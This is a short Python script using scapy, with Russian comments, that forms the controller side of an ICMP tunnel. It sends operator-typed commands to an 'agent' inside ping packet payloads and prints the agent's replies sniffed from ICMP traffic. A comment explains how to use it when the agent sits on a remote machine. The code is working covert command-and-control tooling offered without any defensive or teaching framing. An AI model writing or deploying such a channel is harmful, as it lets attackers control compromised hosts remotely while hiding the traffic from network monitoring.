#!/usr/bin/env python3
from scapy.all import *
def main():
    while True:
        command = input('# Enter command: ')
        # создаём ICMP-пакет с командой в качестве полезной нагрузки
        pinger = IP(dst="localhost")/ICMP(id=0x0001, seq=0x1)/command
        send(pinger)
        # ждём ICMP-сообщение с ответом от агента
        rx = sniff(count=1, timeout=2)
        # если агент не на локальной машине, используйте это: rx = sniff(filter="icmp", count=1)
        print(rx[0][Raw].load.decode('utf-8'))
if __name__ == "__main__":
    main()